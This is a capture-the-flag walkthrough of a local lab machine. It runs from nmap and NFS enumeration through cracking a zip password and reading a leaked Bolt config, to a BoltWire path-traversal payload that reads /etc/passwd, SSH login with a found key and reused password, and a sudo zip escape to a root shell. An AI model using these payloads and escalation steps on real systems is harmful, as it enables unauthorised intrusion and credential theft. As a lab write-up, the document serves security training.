## Information Gathering
- Scanning with nmap

```
┌──(xron㉿Trix)-[~]
└─$ nmap -A -T4 -p- -v 192.168.11.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 19:56 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating Ping Scan at 19:57
Scanning 192.168.11.131 [2 ports]
Completed Ping Scan at 19:57, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:57
Completed Parallel DNS resolution of 1 host. at 19:57, 6.00s elapsed
Initiating Connect Scan at 19:57
Scanning 192.168.11.131 [65535 ports]
Discovered open port 22/tcp on 192.168.11.131
Discovered open port 8080/tcp on 192.168.11.131
Discovered open port 111/tcp on 192.168.11.131
Discovered open port 80/tcp on 192.168.11.131
Discovered open port 49727/tcp on 192.168.11.131
Discovered open port 40859/tcp on 192.168.11.131
Discovered open port 55147/tcp on 192.168.11.131
Discovered open port 43829/tcp on 192.168.11.131
Discovered open port 2049/tcp on 192.168.11.131
Completed Connect Scan at 19:57, 2.40s elapsed (65535 total ports)
Initiating Service scan at 19:57
Scanning 9 services on 192.168.11.131
Completed Service scan at 19:57, 6.21s elapsed (9 services on 1 host)
NSE: Script scanning 192.168.11.131.
Initiating NSE at 19:57
Completed NSE at 19:57, 1.01s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.03s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Nmap scan report for 192.168.11.131
Host is up (0.0015s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd96ec082fb1ea06cafc468a7e8ae355 (RSA)
|   256 56323b9f482de07e1bdf20f80360565e (ECDSA)
|_  256 95dd20ee6f01b6e1432e3cf438035b36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45181/udp   mountd
|   100005  1,2,3      49389/udp6  mountd
|   100005  1,2,3      54139/tcp6  mountd
|   100005  1,2,3      55147/tcp   mountd
|   100021  1,3,4      32889/tcp6  nlockmgr
|   100021  1,3,4      43829/tcp   nlockmgr
|   100021  1,3,4      51018/udp   nlockmgr
|   100021  1,3,4      59184/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
40859/tcp open  mountd   1-3 (RPC #100005)
43829/tcp open  nlockmgr 1-4 (RPC #100021)
49727/tcp open  mountd   1-3 (RPC #100005)
55147/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds

```
## Exploring Network File server on port 2049

- Listing server mount directories
```
┌──(xron㉿Trix)-[~]
└─$ showmount -e 192.168.11.131
Export list for 192.168.11.131:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```
- creating directory to mount

```
┌──(xron㉿Trix)-[~]
└─$ sudo mkdir /mnt/dev        
```
- mounting to /mnt/dev

```
┌──(xron㉿Trix)-[~]
└─$ sudo mount -t nfs 192.168.11.131:/srv/nfs /mnt/dev

┌──(xron㉿Trix)-[/mnt/dev]
└─$ cd /mnt/dev && ls
save.zip          
```

- Using fcrackzip to crack the pasword of save.zip

```
┌──(root㉿Trix)-[/mnt/dev]
└─# apt install fcrackzip

┌──(root㉿Trix)-[/mnt/dev]
└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101
```

- Exploring save.zip

```
┌──(root㉿Trix)-[/mnt/dev]
└─# unzip save.zip 
Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt                
                                                                                                                                               
┌──(root㉿Trix)-[/mnt/dev]
└─# ls
id_rsa  save.zip  todo.txt
                                                                                                                                               
┌──(root㉿Trix)-[/mnt/dev]
└─# cat todo.txt 
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```

## Directory Enumeration on web servers

- Using ffuf on port 80

```
┌──(xron㉿Trix)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.11.131/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.11.131/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

public                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 143ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 154ms]
src                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]
app                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 365ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 368ms]
vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 559ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 589ms]
extensions              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 0ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 752ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 753ms]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 800ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 850ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 949ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 951ms]
# on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 954ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 963ms]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 845ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5ms]
:: Progress: [220560/220560] :: Job [1/1] :: 1288 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
 ```

 - Using ffuf on port 8080

 ```
 ┌──(xron㉿Trix)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.11.131:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.11.131:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 39ms]
dev                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]
                        [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 854ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 992ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1078ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1201ms]
#                       [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1191ms]
#                       [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1243ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1258ms]
# on atleast 2 different hosts [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1672ms]
#                       [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1703ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94590, Words: 4693, Lines: 1159, Duration: 1746ms]
# Copyright 2007 James Fisher [Status: 200, Size: 94590, Words: 4693, Lines: 1159, Duration: 1801ms]
#                       [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 1805ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94590, Words: 4693, Lines: 1159, Duration: 2051ms]
                        [Status: 200, Size: 94591, Words: 4693, Lines: 1159, Duration: 624ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [220560/220560] :: Job [1/1] :: 16836 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

# Exploring directories

 - Found config directory inside http://{IP}/app
 - config.yml file inside http://{IP}/app/config

```
┌──(xron㉿Trix)-[~/Downloads]
└─$ cat config.yml      
# Database setup. The driver can be either 'sqlite', 'mysql' or 'postgres'.
#
# For SQLite, only the databasename is required. However, MySQL and PostgreSQL
# also require 'username', 'password', and optionally 'host' ( and 'port' ) if the database
# server is not on the same host as the web server.
#
# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java

# The name of the website
sitename: A sample site
payoff: The amazing payoff goes here
..................
```

**Found** username: bolt and password: I_love_java

## Exploiting Bolt

- Found an exploit in Local file inclusion
- Refer to https://www.exploit-db.com/exploits/48411

```
LFI:

Steps to Reproduce:

1) Using HTTP GET request browse to the following page, whilst being authenticated user.
http://192.168.11.131/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
```

- Found Register page at http://{IP}:8080/dev
- Registred as random user
- Abused search query using exploit
- Found /etc/passwd contents at 
       
      http://192.168.11.131:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd

```
BoltWire

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```

- Foung user jeanpaul which seems to be the full form of jp found earlier in todo.txt inside save.zip

## Trying to login as jeanpaul via ssh using id_rsa file found earlier

```
┌──(root㉿Trix)-[/mnt/dev]
└─# ssh -i id_rsa jeanpaul@192.168.11.131
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ 
```
**NOTE:** Used password 'I_love_java' found earlier
- We successfully managed to login as jeanpaul

## Exploring jeanpaul

```
jeanpaul@dev:~$ whoami
jeanpaul

jeanpaul@dev:~$ pwd
/home/jeanpaul

jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```

- jeanpaul has sudo priviledges using /usr/bin/zip

```
jeanpaul@dev:~$ sudo zip

Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
Zip 3.0 (July 5th 2008). Usage:
zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
  The default action is to add or replace zipfile entries from list, which
  can include the special name - to compress standard input.
  If zipfile and list are omitted, zip compresses stdin to stdout.
  -f   freshen: only changed files  -u   update: only changed or new files
  -d   delete entries in zipfile    -m   move into zipfile (delete OS files)
  -r   recurse into directories     -j   junk (don't record) directory names
  -0   store only                   -l   convert LF to CR LF (-ll CR LF to LF)
  -1   compress faster              -9   compress better
  -q   quiet operation              -v   verbose operation/print version info
  -c   add one-line comments        -z   add zipfile comment
  -@   read names from stdin        -o   make zipfile as old as latest entry
  -x   exclude the following names  -i   include only the following names
  -F   fix zipfile (-FF try harder) -D   do not add directory entries
  -A   adjust self-extracting exe   -J   junk zipfile prefix (unzipsfx)
  -T   test zipfile integrity       -X   eXclude eXtra file attributes
  -y   store symbolic links as the link instead of the referenced file
  -e   encrypt                      -n   don't compress these suffixes
  -h2  show more help
  ```
   - Works without password !

## Abusing sudo priviledges in zip

- Getting root shell accessvia sudo zip
- **Reffer to** https://gtfobins.github.io/gtfobins/zip/


```
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

- **Getting the root shell**
```
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# pwd
/home/jeanpaul
# cd /root
# ls
flag.txt
# cat flag.txt	
Congratz on rooting this box !
# 
```